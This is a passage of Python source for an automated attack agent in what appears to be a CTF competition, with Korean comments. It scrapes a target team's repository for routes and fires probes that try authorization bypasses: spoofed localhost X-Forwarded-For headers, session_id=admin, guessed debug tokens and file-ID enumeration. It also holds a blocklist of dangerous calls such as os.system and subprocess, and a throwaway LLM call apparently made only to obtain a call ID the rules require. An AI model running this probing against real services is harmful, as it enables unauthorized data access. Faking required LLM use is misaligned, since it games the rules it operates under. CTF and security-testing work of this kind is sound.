#!/usr/bin/env python3
"""
Attack agent (team2) — v7: 컨테이너 재실행 환경에 적응

v7 변경 (R13 로그 분석):
  - 같은 라운드 첫 /attack에서 429 받으면 즉시 attack 단계 전부 스킵하고
    PoC만 제출 (이전 run이 turn 다 썼을 때 대응)
  - vuln_spec.json이 충분히 명확하면 seed 단계 건너뛰고 바로 repo부터
    (seed는 generic이라 새 path가 많은 타겟에 약함)
  - 404/502 응답 받은 path를 같은 라운드 내 재시도 안 함 (path skip list)
  - PoC source를 /tmp/poc_cache_{round}/에 저장하여 다음 run에서 즉시 재제출

v6 유지:
  - FLAG_RE strict + placeholder blocklist
  - 같은 vuln finding 1개만
  - Budget 캐리오버 (seed 2 → repo 4 → follow 4)
  - replay PoC 우선, static fallback
  - PoC timeout 10초
"""
from __future__ import annotations

import ast
import io
import json
import os
import re
import sys
import tarfile
import time
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

try:
    import httpx
except ImportError:
    httpx = None


# ═══════════════════════════════════════════════════════════════════════════
# 설정값
# ═══════════════════════════════════════════════════════════════════════════
MODEL_CHAIN = [
    "openai/gpt-4o-mini",
    "google/gemini-2.0-flash-001",
    "google/gemini-flash-1.5",
    "qwen/qwen-2.5-14b",
    "mistralai/mistral-small-3.1",
    "microsoft/phi-4",
    "xiaomi/mimo",
]

FLAG_IDS = ("vuln1", "vuln2", "vuln3", "vuln4")

# ── 오탐 감소: strict FLAG_RE ──
# 영숫자/언더스코어/하이픈만, 4~128자
FLAG_RE = re.compile(r"\bHSPACE\{([A-Za-z0-9_\-]{4,128})\}")
# Placeholder/예시로 자주 쓰이는 단어 (오탐 차단)
FLAG_PLACEHOLDER_BLOCKLIST = {
    "test", "example", "sample", "placeholder", "your_flag_here",
    "flag", "the_flag", "format", "xxx", "yyy", "zzz",
    "abc", "abcd", "abcdef", "abcdefgh",
    "00000000", "11111111", "12345678",
}

SESSION_RE = re.compile(
    r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I
)
SESSION_FIELD_RE = re.compile(
    r"\b(?:session_id|session|sid|vault_id|workspace_id)[\"'\s:=]+([A-Za-z0-9_.:\-]{3,96})\b",
    re.I,
)
FILE_ID_RE = re.compile(r"/files?/(\d+)\b|\bfile_id[\"'\s:=]+(\d+)\b", re.I)
FILE_FIELD_RE = re.compile(
    r"\b(?:file_id|note_id|attachment_id|document_id|doc_id|id)[\"'\s:=]+(\d{1,12})\b",
    re.I,
)
ROUTE_RE = re.compile(r"@\w+\.(get|post|put|delete|patch)\(\s*[\"']([^\"']+)[\"']", re.I)
API_ROUTE_RE = re.compile(
    r"@\w+\.api_route\(\s*[\"']([^\"']+)[\"'][^)]*methods\s*=\s*\[([^\]]+)\]",
    re.I | re.S,
)
ROUTER_PREFIX_RE = re.compile(r"APIRouter\([^)]*prefix\s*=\s*[\"']([^\"']+)[\"']", re.S)

MAX_LLM_CALLS = int(os.getenv("MAX_LLM_CALLS", "4"))
# 룰북 10턴 한도. seed 2 + repo 4 + follow 4 = 10 (모든 단계 budget 사용 시)
# 단 1단계에서 미사용 budget은 다음 단계로 캐리오버 (carry_budget)
MAX_TOTAL_ATTACKS_PER_RUN = int(os.getenv("MAX_TOTAL_ATTACKS_PER_RUN", "10"))
BLACKBOX_SEED_BUDGET = int(os.getenv("BLACKBOX_SEED_BUDGET", "2"))
REPO_PROBE_BUDGET = int(os.getenv("REPO_PROBE_BUDGET", "4"))
FOLLOWUP_PROBE_BUDGET = int(os.getenv("FOLLOWUP_PROBE_BUDGET", "4"))
TARGET_FLAG_COUNT = int(os.getenv("TARGET_FLAGS", "4"))
MAX_REPO_FILES = int(os.getenv("MAX_REPO_FILES", "32"))
MAX_REPO_FILE_BYTES = int(os.getenv("MAX_REPO_FILE_BYTES", str(12 * 1024)))
MAX_REPO_PROMPT_BYTES = int(os.getenv("MAX_REPO_PROMPT_BYTES", str(64 * 1024)))
POC_MAX_BYTES = int(os.getenv("POC_MAX_BYTES", str(64 * 1024)))
KEEPALIVE_SECONDS = int(os.getenv("KEEPALIVE_SECONDS", "0"))
ENABLE_LLM_POC_FALLBACK = os.getenv("ENABLE_LLM_POC_FALLBACK", "0").lower() in {"1","true","yes"}
ENABLE_STATIC_REPO_POC = os.getenv("ENABLE_STATIC_REPO_POC", "1").lower() in {"1","true","yes"}
MAX_STATIC_PROBES_PER_FLAG = int(os.getenv("MAX_STATIC_PROBES_PER_FLAG", "10"))

# v7: PoC source 캐시 (라운드별, 같은 라운드 재실행 시 즉시 재제출용)
POC_CACHE_DIR = Path(os.getenv("POC_CACHE_DIR", "/tmp/hspace_poc_cache"))
# 404/502 받은 path는 같은 라운드 내 재시도 안 함
PATH_SKIP_FILE = POC_CACHE_DIR / "skip_paths.json"

LLM_RPM = 25
ATTACK_RPM = 18
POCS_RPM = 10

NOISY_AGENT_PATHS = {
    "/docs", "/redoc", "/openapi.json",
    "/upload", "/preview", "/api/markdown/preview",
}

TEXT_SUFFIXES = {
    ".py", ".js", ".ts", ".tsx", ".jsx", ".json", ".yaml", ".yml",
    ".toml", ".ini", ".cfg", ".md", ".txt", ".html", ".css", ".sh",
}
IMPORTANT_NAMES = {
    "vuln_spec.json", "main.py", "app.py", "server.py", "models.py",
    "requirements.txt", "pyproject.toml", "package.json", "dockerfile",
}
SKIP_DIRS = {
    ".git", "__pycache__", ".pytest_cache", ".mypy_cache",
    ".venv", "venv", "node_modules", "dist", "build",
}

POC_BANNED_PATTERNS = (
    "subprocess", "os.system", "os.popen", "eval(", "exec(",
    "__import__", "ctypes", "pickle.loads", "shutil.rmtree",
)
# ── 오탐 감소: 확장된 import 화이트리스트 ──
POC_ALLOWED_IMPORTS = {
    "json", "os", "re", "sys", "urllib",
    "io", "base64", "hashlib", "http", "socket", "ssl",
    "string", "binascii", "struct", "html",
    "collections", "itertools", "functools",
    "typing", "datetime", "math", "random",
    "uuid", "zipfile",
}


class AttackTurnBudgetExhausted(RuntimeError):
    pass


class CompatResponse:
    def __init__(self, status_code: int, headers: dict[str, str], content: bytes):
        self.status_code = status_code
        self.headers = headers
        self.content = content
        self.text = content.decode("utf-8", errors="replace")

    def json(self) -> Any:
        return json.loads(self.text)


def log(message: str) -> None:
    print(f"[attack-agent] {message}", file=sys.stderr, flush=True)


def compact(value: Any, limit: int = 500) -> str:
    try:
        text = value if isinstance(value, str) else json.dumps(value, ensure_ascii=False, sort_keys=True)
    except Exception:
        text = str(value)
    return text if len(text) <= limit else text[:limit] + "...[truncated]"


# ═══════════════════════════════════════════════════════════════════════════
# HTTP helpers (httpx 우선, urllib fallback)
# ═══════════════════════════════════════════════════════════════════════════
def _http_get(url: str, *, headers=None, timeout=30.0):
    if httpx is not None:
        return httpx.get(url, headers=headers, timeout=timeout)
    req = Request(url, headers=headers or {}, method="GET")
    try:
        with urlopen(req, timeout=timeout) as resp:
            return CompatResponse(resp.status, dict(resp.headers), resp.read())
    except HTTPError as exc:
        return CompatResponse(exc.code, dict(exc.headers), exc.read())


def _http_post(url, *, headers=None, json_body=None, data=None, timeout=30.0):
    if httpx is not None:
        return httpx.post(url, headers=headers, json=json_body, data=data, timeout=timeout)
    final_headers = dict(headers or {})
    body: bytes | None = None
    if json_body is not None:
        body = json.dumps(json_body).encode("utf-8")
        final_headers.setdefault("Content-Type", "application/json")
    elif isinstance(data, dict):
        body = urlencode(data).encode("utf-8")
        final_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, str):
        body = data.encode("utf-8")
    elif isinstance(data, (bytes, bytearray)):
        body = bytes(data)
    req = Request(url, data=body, headers=final_headers, method="POST")
    try:
        with urlopen(req, timeout=timeout) as resp:
            return CompatResponse(resp.status, dict(resp.headers), resp.read())
    except HTTPError as exc:
        return CompatResponse(exc.code, dict(exc.headers), exc.read())


def response_json(resp: Any) -> Any:
    try:
        return resp.json()
    except Exception:
        try:
            return json.loads(getattr(resp, "text", ""))
        except Exception:
            return getattr(resp, "text", "")


def header_get(headers: Any, name: str) -> str:
    if not headers:
        return ""
    try:
        value = headers.get(name)
        if value:
            return str(value)
    except Exception:
        pass
    name_l = name.lower()
    for key, value in dict(headers).items():
        if str(key).lower() == name_l:
            return str(value)
    return ""


def check_response(resp: Any, label: str) -> None:
    if getattr(resp, "status_code", 0) >= 400:
        raise RuntimeError(f"{label} failed: HTTP {resp.status_code} {getattr(resp, 'text', '')[:400]}")


# ═══════════════════════════════════════════════════════════════════════════
# v7: PoC 캐시 (라운드별, 같은 라운드 재실행 시 turn 안 쓰고 즉시 재제출)
# ═══════════════════════════════════════════════════════════════════════════
def _round_cache_dir(round_num: int, target: str) -> Path:
    """라운드+타겟별 캐시 디렉토리. 다른 라운드와 섞이지 않게."""
    d = POC_CACHE_DIR / f"r{round_num}_{target}"
    try:
        d.mkdir(parents=True, exist_ok=True)
    except OSError:
        pass
    return d


def save_poc_cache(round_num: int, target: str, flag_id: str, source: str) -> None:
    """이번 run에서 만든 PoC source 저장. 다음 run에서 재사용."""
    try:
        path = _round_cache_dir(round_num, target) / f"{flag_id}.py"
        path.write_text(source, encoding="utf-8")
    except OSError as exc:
        log(f"poc cache save failed {flag_id}: {exc}")


def load_poc_cache(round_num: int, target: str, flag_id: str) -> str | None:
    """이전 run이 같은 라운드에 만든 PoC source. 없으면 None."""
    try:
        path = _round_cache_dir(round_num, target) / f"{flag_id}.py"
        if path.exists():
            return path.read_text(encoding="utf-8")
    except OSError:
        pass
    return None


def load_skip_paths(round_num: int, target: str) -> set[str]:
    """이번 라운드에 이미 실패한(404/502) path 목록."""
    try:
        path = _round_cache_dir(round_num, target) / "skip.json"
        if path.exists():
            data = json.loads(path.read_text(encoding="utf-8"))
            if isinstance(data, list):
                return set(data)
    except (OSError, json.JSONDecodeError):
        pass
    return set()


def save_skip_paths(round_num: int, target: str, paths: set[str]) -> None:
    try:
        p = _round_cache_dir(round_num, target) / "skip.json"
        p.write_text(json.dumps(sorted(paths)), encoding="utf-8")
    except OSError:
        pass


# ═══════════════════════════════════════════════════════════════════════════
# Rate limiter
# ═══════════════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, name: str, rpm: int):
        self.name = name
        self.rpm = rpm
        self.times: deque[float] = deque()

    def acquire(self) -> None:
        now = time.time()
        while self.times and now - self.times[0] > 60.0:
            self.times.popleft()
        if len(self.times) >= self.rpm:
            wait = max(1.0, 60.0 - (now - self.times[0]) + 0.25)
            log(f"rate limit {self.name}; sleep {wait:.1f}s")
            time.sleep(wait)
            return self.acquire()
        self.times.append(now)


_LIMITERS = {
    "llm": RateLimiter("llm", LLM_RPM),
    "attack": RateLimiter("attack", ATTACK_RPM),
    "pocs": RateLimiter("pocs", POCS_RPM),
}


# ═══════════════════════════════════════════════════════════════════════════
# 환경 / budget / state
# ═══════════════════════════════════════════════════════════════════════════
@dataclass(frozen=True)
class AgentEnv:
    team_id: str
    target_team: str
    round_num: int
    run_id: str
    run_token: str
    openrouter_base_url: str
    agent_base_url: str

    @classmethod
    def from_env(cls) -> "AgentEnv":
        return cls(
            team_id=os.environ.get("TEAM_ID", "team2"),
            target_team=os.environ.get("TARGET_TEAM", ""),
            round_num=int(os.environ.get("ROUND") or "0"),
            run_id=os.environ.get("AGENT_RUN_ID", ""),
            run_token=os.environ.get("AGENT_RUN_TOKEN", ""),
            openrouter_base_url=(
                os.environ.get("OPENROUTER_BASE_URL")
                or os.environ.get("OPENAI_BASE_URL")
                or ""
            ).rstrip("/"),
            agent_base_url=os.environ.get("HSPACE_AGENT_BASE_URL", "").rstrip("/"),
        )

    @property
    def auth(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.run_token}"} if self.run_token else {}


@dataclass
class Budget:
    llm_calls: int = 0
    attack_calls: int = 0
    poc_submits: int = 0
    turns_remaining: int | None = None
    attack_exhausted: bool = False

    def can_llm(self) -> bool:
        return self.llm_calls < MAX_LLM_CALLS

    def can_attack(self) -> bool:
        if self.attack_exhausted:
            return False
        if self.attack_calls >= MAX_TOTAL_ATTACKS_PER_RUN:
            return False
        return not isinstance(self.turns_remaining, int) or self.turns_remaining > 0

    def can_poc(self) -> bool:
        return self.poc_submits < len(FLAG_IDS)

    def report(self) -> str:
        return (
            f"llm={self.llm_calls}/{MAX_LLM_CALLS} "
            f"atk={self.attack_calls}/{MAX_TOTAL_ATTACKS_PER_RUN} "
            f"poc={self.poc_submits}/{len(FLAG_IDS)} "
            f"turns_left={self.turns_remaining}"
        )


@dataclass
class RepoSnapshot:
    team: str = ""
    commit: str = ""
    root: Path | None = None
    context: str = ""


def text_of(value: Any) -> str:
    if isinstance(value, bytes):
        return value.decode("utf-8", "replace")
    if isinstance(value, str):
        return value
    try:
        return json.dumps(value, ensure_ascii=False, sort_keys=True)
    except Exception:
        return str(value)


# ─── 오탐 감소: 엄격한 flag 검증 ─────────────────────────────────────────
def confirmed_flags(value: Any) -> list[str]:
    """진짜 flag만 추출. placeholder/단조/너무 짧은 거 거부."""
    text = text_of(value)
    matches = list(FLAG_RE.findall(text))
    if isinstance(value, dict):
        for item in value.get("flags_found") or []:
            matches.extend(FLAG_RE.findall(text_of(item)))

    confirmed: list[str] = []
    for inner in matches:
        inner_l = inner.lower()
        if inner_l in FLAG_PLACEHOLDER_BLOCKLIST:
            continue
        # 너무 짧은 건 placeholder일 가능성 — 6자 이상만 인정
        # (len(set) 휴리스틱은 위험: HSPACE{a1a1} 같은 진짜 flag도 거부할 수 있음)
        if len(inner) < 6:
            continue
        flag = f"HSPACE{{{inner}}}"
        if flag not in confirmed:
            confirmed.append(flag)
    return confirmed


def extract_sessions(value: Any) -> list[str]:
    text = text_of(value)
    sessions = set(SESSION_RE.findall(text))
    for candidate in SESSION_FIELD_RE.findall(text):
        lowered = candidate.lower()
        if lowered in {"null", "none", "true", "false", "admin"}:
            continue
        sessions.add(candidate)
    return sorted(sessions)


def extract_file_ids(value: Any) -> list[str]:
    ids: set[str] = set()
    text = text_of(value)
    for match in FILE_ID_RE.findall(text):
        for item in match:
            if item and item.isdigit():
                ids.add(item)
    ids.update(FILE_FIELD_RE.findall(text))
    return sorted(ids, key=lambda x: int(x))


# ─── 오탐 감소: fingerprint 좁힘 ─────────────────────────────────────────
def looks_like_study_compass(value: Any) -> bool:
    """Study Compass인지 확인. 약한 마커 단일 트리거 방지."""
    if isinstance(value, dict):
        status = value.get("status_code") or value.get("status")
        if isinstance(status, int) and status >= 500:
            return False
    text = text_of(value).lower()

    # 강한 마커 (하나만 있어도 확실)
    strong = (
        "study compass",
        '"session_id":',  # JSON field
        '"file_id":',
        "/debug/state",
        "vault.zip",
        "frontmatter",
    )
    if any(marker in text for marker in strong):
        return True

    # 약한 마커 — 2개 이상 동시
    weak = ("session_id", "markdown", "/files", "/analysis", "/recommend", "yaml")
    weak_hits = sum(1 for marker in weak if marker in text)
    return weak_hits >= 2


@dataclass
class AgentState:
    flags: set[str] = field(default_factory=set)
    sessions: set[str] = field(default_factory=set)
    file_ids: set[str] = field(default_factory=set)
    submitted_ids: set[str] = field(default_factory=set)
    solved_ids: set[str] = field(default_factory=set)
    seen_probe_keys: set[str] = field(default_factory=set)
    observations: list[dict[str, Any]] = field(default_factory=list)
    confirmed_findings: list[dict[str, Any]] = field(default_factory=list)
    # v7: 같은 라운드 내 404/502 받은 path 재시도 방지
    skip_paths: set[str] = field(default_factory=set)

    # ─── 오탐 감소: 같은 vuln에 finding 1개만 ──
    def add_observation(self, probe: dict[str, Any], result: dict[str, Any]) -> list[str]:
        flags = confirmed_flags(result)
        sessions = extract_sessions(result)
        file_ids = extract_file_ids(result)
        self.observations.append({"probe": probe, "result": result})
        self.flags.update(flags)
        self.sessions.update(sessions)
        self.file_ids.update(file_ids)

        flag_id = str(probe.get("flag_id") or "")
        if flags and flag_id in FLAG_IDS:
            existing = [f for f in self.confirmed_findings if f.get("flag_id") == flag_id]
            if not existing:
                self.confirmed_findings.append({
                    "flag_id": flag_id,
                    "probe": dict(probe),
                    "flags": flags,
                    "result": result,
                })
        return flags


# ═══════════════════════════════════════════════════════════════════════════
# LLM
# ═══════════════════════════════════════════════════════════════════════════
def call_llm(env, budget, *, purpose, messages, max_tokens, temperature=0.1):
    if not budget.can_llm() or not env.openrouter_base_url or not env.run_token:
        return None
    for model in MODEL_CHAIN:
        _LIMITERS["llm"].acquire()
        budget.llm_calls += 1
        try:
            resp = _http_post(
                f"{env.openrouter_base_url}/chat/completions",
                headers={**env.auth, "X-Agent-Purpose": purpose},
                json_body={
                    "model": model, "messages": messages,
                    "temperature": temperature, "max_tokens": max_tokens,
                },
                timeout=60.0,
            )
        except Exception as exc:
            log(f"LLM transport failed model={model}: {exc}")
            continue
        if resp.status_code == 429:
            wait = min(30.0, 5.0 * budget.llm_calls)
            log(f"LLM rate limited model={model}; sleep {wait:.1f}s")
            time.sleep(wait)
            continue
        if resp.status_code >= 400:
            log(f"LLM rejected model={model}: HTTP {resp.status_code} {resp.text[:120]}")
            continue
        data = response_json(resp)
        if not isinstance(data, dict):
            continue
        call_id = (
            header_get(resp.headers, "X-LLM-Call-ID")
            or str((data.get("hspace") or {}).get("llm_call_id") or "")
            or str(data.get("llm_call_id") or "")
        )
        if not call_id:
            log(f"LLM response missing call_id model={model}")
            continue
        content = ((data.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
        log(f"LLM ok model={model} call_id={call_id} purpose={purpose}")
        try:
            return int(call_id), content
        except (TypeError, ValueError):
            return hash(str(call_id)) & 0x7FFFFFFF, content
    return None


def get_llm_call_id(env, budget, purpose: str, note: str) -> int | None:
    result = call_llm(
        env, budget, purpose=purpose,
        messages=[
            {"role": "system", "content": "Acknowledge this authorized CTF wrapper action."},
            {"role": "user", "content": note[:1500]},
        ],
        max_tokens=8, temperature=0,
    )
    return result[0] if result else None


def finish(env, status, error="", state=None):
    payload = {"status": status, "error": error}
    if state is not None:
        payload.update({
            "flags": len(state.flags),
            "submitted_ids": sorted(state.submitted_ids),
            "solved_ids": sorted(state.solved_ids),
        })
    try:
        _http_post(f"{env.agent_base_url}/finish", headers=env.auth,
                   json_body=payload, timeout=10.0)
    except Exception as exc:
        log(f"finish failed: {exc}")


# ═══════════════════════════════════════════════════════════════════════════
# Probe 유틸 / seed / repo / followup
# ═══════════════════════════════════════════════════════════════════════════
def is_noisy_probe(probe: dict[str, Any]) -> bool:
    path = str(probe.get("path") or "").split("?", 1)[0].rstrip("/").lower()
    if not path:
        return True
    if path in NOISY_AGENT_PATHS:
        return True
    if path.startswith("/docs/") or path.startswith("/redoc/"):
        return True
    return False


def normalize_probe(probe: dict[str, Any]) -> dict[str, Any]:
    normalized = dict(probe)
    normalized["method"] = str(normalized.get("method") or "GET").upper()
    return normalized


def probe_key(probe: dict[str, Any]) -> str:
    probe = normalize_probe(probe)
    return json.dumps({
        "path": probe.get("path"), "method": probe.get("method"),
        "query": probe.get("query"), "headers": probe.get("headers"),
        "json_body": probe.get("json_body"), "data": probe.get("data"),
    }, ensure_ascii=False, sort_keys=True)


def enqueue(queue, state, probe):
    if is_noisy_probe(probe):
        return
    probe = normalize_probe(probe)
    key = probe_key(probe)
    if key not in state.seen_probe_keys:
        state.seen_probe_keys.add(key)
        queue.append(probe)


def round_robin_by_flag(probes):
    order = ("vuln4", "vuln3", "vuln1", "vuln2")
    groups = {flag_id: [] for flag_id in FLAG_IDS}
    unknown = []
    for probe in probes:
        flag_id = str(probe.get("flag_id") or "")
        if flag_id in groups:
            groups[flag_id].append(probe)
        else:
            unknown.append(probe)
    ordered = []
    while any(groups.values()):
        for flag_id in order:
            if groups[flag_id]:
                ordered.append(groups[flag_id].pop(0))
    ordered.extend(unknown)
    return ordered


def seed_probes():
    return round_robin_by_flag([
        {
            "flag_id": "vuln4", "type": "debug_runtime",
            "path": "/debug/state", "method": "GET",
            "query": {"verbose": "true"},
            "headers": {"X-Debug-Token": "internal",
                        "X-Service-Key": "svc-2026-int",
                        "X-Runtime-Mode": "probe"},
        },
        {
            "flag_id": "vuln1", "type": "analysis_meta",
            "path": "/analysis", "method": "GET",
            "query": {"include_meta": "true"},
            "headers": {"X-Export-Mode": "export-v2",
                        "X-Pipeline-Stage": "cache",
                        "X-Client-Build": "20260520"},
        },
        {
            "flag_id": "vuln2", "type": "recommend_history",
            "path": "/recommend", "method": "GET",
            "query": {"expand": "history"},
            "headers": {"X-Legacy-Api": "v0",
                        "X-Compat-Mode": "legacy-rpc",
                        "X-Client-Epoch": "0"},
        },
        {
            "flag_id": "vuln3", "type": "file_admin",
            "path": "/files", "method": "GET",
            "query": {"session_id": "admin"},
            "headers": {"X-Forwarded-For": "127.0.0.1",
                        "X-Real-IP": "::1",
                        "X-Vault-Origin": "local"},
        },
        {"flag_id": "vuln4", "type": "debug_include_all",
         "path": "/debug/state", "query": {"include": "all"}},
        {"flag_id": "vuln1", "type": "analysis_internal",
         "path": "/analysis",
         "headers": {"X-Internal-Service": "analysis-worker",
                     "User-Agent": "StudyCompass/2.0"}},
        {"flag_id": "vuln2", "type": "recommend_expand",
         "path": "/recommend", "query": {"expand": "true"}},
        {"flag_id": "vuln3", "type": "files_plain", "path": "/files"},
    ])


def fetch_repo(env, dest="target_repo"):
    resp = _http_get(f"{env.agent_base_url}/target-repo.tar", headers=env.auth, timeout=35.0)
    check_response(resp, "target repo fetch")
    repo_team = header_get(resp.headers, "X-Repo-Team") or env.target_team
    commit = header_get(resp.headers, "X-Repo-Commit")
    dest_root = (Path(dest) / (env.run_id or f"{repo_team}-{int(time.time())}")).resolve()
    dest_root.mkdir(parents=True, exist_ok=True)
    with tarfile.open(fileobj=io.BytesIO(resp.content), mode="r:*") as archive:
        for member in archive.getmembers():
            member_path = (dest_root / member.name).resolve()
            member_path.relative_to(dest_root)
            if member.isdir():
                member_path.mkdir(parents=True, exist_ok=True)
                continue
            if not member.isfile():
                continue
            member_path.parent.mkdir(parents=True, exist_ok=True)
            extracted = archive.extractfile(member)
            if extracted is not None:
                member_path.write_bytes(extracted.read())
    root = dest_root / repo_team
    if not root.exists():
        root = dest_root
    snapshot = RepoSnapshot(team=repo_team, commit=commit, root=root)
    snapshot.context = build_repo_context(snapshot)
    return snapshot


def is_candidate_file(path):
    name = path.name.lower()
    return name in IMPORTANT_NAMES or path.suffix.lower() in TEXT_SUFFIXES


def repo_priority(path):
    name = path.name.lower()
    if name == "vuln_spec.json":
        rank = 0
    elif name in {"main.py", "app.py", "server.py"}:
        rank = 1
    elif name in IMPORTANT_NAMES:
        rank = 2
    elif path.suffix.lower() == ".py":
        rank = 3
    else:
        rank = 4
    return rank, str(path)


def build_repo_context(snapshot):
    if snapshot.root is None:
        return ""
    root = snapshot.root
    chunks = [f"Target repo team: {snapshot.team}", f"Target repo commit: {snapshot.commit}"]
    total = sum(len(c.encode("utf-8")) for c in chunks)
    included = 0
    paths = []
    for path in root.rglob("*"):
        if not path.is_file():
            continue
        try:
            rel = path.relative_to(root)
        except ValueError:
            continue
        if any(part in SKIP_DIRS for part in rel.parts):
            continue
        if is_candidate_file(path):
            paths.append(path)
    for path in sorted(paths, key=repo_priority):
        if included >= MAX_REPO_FILES or total >= MAX_REPO_PROMPT_BYTES:
            break
        try:
            raw = path.read_bytes()
        except OSError:
            continue
        if b"\x00" in raw:
            continue
        text = raw[:MAX_REPO_FILE_BYTES].decode("utf-8", "replace")
        chunk = f"\n\n### {path.relative_to(root)}\n```\n{text}\n```"
        if total + len(chunk.encode("utf-8")) > MAX_REPO_PROMPT_BYTES:
            break
        chunks.append(chunk)
        total += len(chunk.encode("utf-8"))
        included += 1
    return "".join(chunks)


def replace_payload(value, payload):
    if isinstance(value, str):
        return value.replace("{{PAYLOAD}}", payload)
    if isinstance(value, list):
        return [replace_payload(item, payload) for item in value]
    if isinstance(value, dict):
        return {replace_payload(k, payload): replace_payload(v, payload) for k, v in value.items()}
    return value


def join_route(prefix, route):
    prefix = (prefix or "").strip()
    route = (route or "").strip()
    if not prefix:
        return route or "/"
    if not route or route == "/":
        return prefix if prefix.startswith("/") else "/" + prefix
    return "/" + "/".join(part.strip("/") for part in (prefix, route) if part.strip("/"))


def route_to_concrete(route):
    replacements = {
        "file_id": "1", "id": "1", "session_id": "admin",
        "report_id": "1", "user_id": "1", "note_id": "1",
        "document_id": "1", "doc_id": "1", "attachment_id": "1",
        "name": "admin", "filename": "note.md", "slug": "admin",
        "path": "flag",
    }
    def repl(match):
        key = match.group(1)
        return replacements.get(key.lower(), "1")
    return re.sub(r"\{([^}:]+)(?::[^}]+)?\}", repl, route)


def probes_from_vuln_spec(snapshot):
    if snapshot.root is None:
        return []
    spec_path = next(snapshot.root.rglob("vuln_spec.json"), None)
    if spec_path is None:
        return []
    try:
        spec = json.loads(spec_path.read_text(encoding="utf-8"))
    except Exception as exc:
        log(f"vuln_spec parse failed: {exc}")
        return []
    items = spec.get("vulnerabilities") or spec.get("vulns") or spec.get("items") or spec
    iterable = list(items.values()) if isinstance(items, dict) else items if isinstance(items, list) else []
    probes = []
    for idx, item in enumerate(iterable, start=1):
        if not isinstance(item, dict):
            continue
        flag_id = str(item.get("id") or item.get("flag_id") or item.get("vuln_id") or f"vuln{idx}")
        if flag_id not in FLAG_IDS:
            continue
        attack = item.get("attack") or item.get("exploit") or item
        if not isinstance(attack, dict):
            continue
        payload = str(item.get("test_payload") or attack.get("test_payload")
                      or attack.get("payload") or "true")
        path = replace_payload(attack.get("endpoint") or attack.get("path") or attack.get("url"), payload)
        if not isinstance(path, str) or not path.startswith("/"):
            continue
        probe = {
            "flag_id": flag_id, "type": "vuln_spec", "source": "vuln_spec.json",
            "static_confidence": 100, "path": path,
            "method": str(attack.get("method") or "GET").upper(),
            "query": replace_payload(attack.get("query") or attack.get("params"), payload),
            "json_body": replace_payload(attack.get("json") or attack.get("body"), payload),
            "headers": replace_payload(attack.get("headers") or {}, payload),
            "payload": payload,
        }
        method = str(probe.get("method") or "GET").upper()
        path_l = str(probe.get("path") or "").lower()
        if not is_noisy_probe(probe) or (method == "POST" and "upload" in path_l):
            probes.append(probe)
    return probes


def probes_from_routes(snapshot):
    if snapshot.root is None:
        return []
    routes: set[tuple[str, str, str]] = set()
    for path in snapshot.root.rglob("*.py"):
        try:
            rel = path.relative_to(snapshot.root)
        except ValueError:
            continue
        if any(part in SKIP_DIRS for part in rel.parts):
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        prefix_match = ROUTER_PREFIX_RE.search(text)
        prefix = prefix_match.group(1) if prefix_match else ""
        for method, route in ROUTE_RE.findall(text):
            if route.startswith("/"):
                routes.add((method.upper(), join_route(prefix, route), str(rel)))
        for route, methods_raw in API_ROUTE_RE.findall(text):
            if not route.startswith("/"):
                continue
            methods = re.findall(r"[\"']([A-Z]+)[\"']", methods_raw.upper())
            for method in methods or ["GET"]:
                routes.add((method.upper(), join_route(prefix, route), str(rel)))

    probes = []
    for method, route, source_file in sorted(routes):
        concrete = route_to_concrete(route)
        low = concrete.lower()
        if is_noisy_probe({"path": concrete}) and not ("upload" in low and method == "POST"):
            continue
        if "debug" in low:
            for idx, variant in enumerate([
                ({"verbose": "true"}, {"X-Debug-Token": "internal"}),
                ({"include": "all"}, {"X-Service-Key": "svc-2026-int"}),
                ({"dump": "state"}, {"X-Runtime-Mode": "probe"}),
            ]):
                query, headers = variant
                probes.append({
                    "flag_id": "vuln4", "type": f"route_debug_{idx}", "source": source_file,
                    "static_confidence": 80 - idx * 5, "path": concrete, "method": "GET",
                    "query": query, "headers": headers,
                })
        elif "analysis" in low:
            for idx, variant in enumerate([
                ({"include_meta": "true"}, {"X-Internal-Service": "analysis-worker"}),
                ({"export": "true"}, {"X-Export-Mode": "export-v2"}),
                ({"stage": "cache"}, {"X-Pipeline-Stage": "cache"}),
            ]):
                query, headers = variant
                probes.append({
                    "flag_id": "vuln1", "type": f"route_analysis_{idx}", "source": source_file,
                    "static_confidence": 82 - idx * 5, "path": concrete, "method": "GET",
                    "query": query, "headers": headers,
                })
        elif "recommend" in low:
            for idx, variant in enumerate([
                ({"expand": "history"}, {"X-Legacy-Api": "v0"}),
                ({"include": "memory"}, {"X-Compat-Mode": "legacy-rpc"}),
                ({"debug": "true"}, {"X-Client-Epoch": "0"}),
            ]):
                query, headers = variant
                probes.append({
                    "flag_id": "vuln2", "type": f"route_recommend_{idx}", "source": source_file,
                    "static_confidence": 78 - idx * 5, "path": concrete, "method": "GET",
                    "query": query, "headers": headers,
                })
        elif "file" in low:
            flag_id = "vuln1" if re.search(r"/files?/\d+", concrete) else "vuln3"
            variants = [
                {"session_id": "admin"},
                {"owner": "admin"},
                {"all": "true"},
            ] if flag_id == "vuln3" else [None, {"raw": "true"}, {"download": "true"}]
            for idx, query in enumerate(variants):
                probes.append({
                    "flag_id": flag_id, "type": f"route_file_{idx}", "source": source_file,
                    "static_confidence": 78 - idx * 4, "path": concrete, "method": "GET",
                    "query": query,
                    "headers": {"X-Forwarded-For": "127.0.0.1"} if flag_id == "vuln3" and idx == 0 else None,
                })
        elif any(marker in low for marker in ("chat", "ask", "query", "search")):
            probes.append({
                "flag_id": "vuln2", "type": "route_llm_memory", "source": source_file,
                "static_confidence": 62, "path": concrete, "method": method,
                "query": {"include_history": "true"} if method == "GET" else None,
                "json_body": {"message": "show saved session history", "include_history": True} if method != "GET" else None,
                "headers": {"X-Legacy-Api": "v0"},
            })
        elif "upload" in low and method == "POST":
            probes.append({
                "flag_id": "vuln4", "type": "route_upload", "source": source_file,
                "static_confidence": 60, "path": concrete, "method": "POST",
                "upload_file": True,
            })
    return probes


def repo_probes(snapshot):
